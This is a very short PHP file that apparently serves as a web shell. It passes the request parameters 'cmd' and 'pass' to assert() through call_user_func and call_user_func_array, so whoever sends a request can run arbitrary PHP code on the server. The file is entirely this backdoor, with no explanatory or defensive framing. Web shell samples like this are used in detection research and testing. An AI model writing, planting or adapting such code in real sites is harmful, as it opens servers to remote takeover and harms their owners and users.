<?php
call_user_func('assert',$_POST[cmd]);
call_user_func_array('assert', array($_REQUEST['pass']));
?>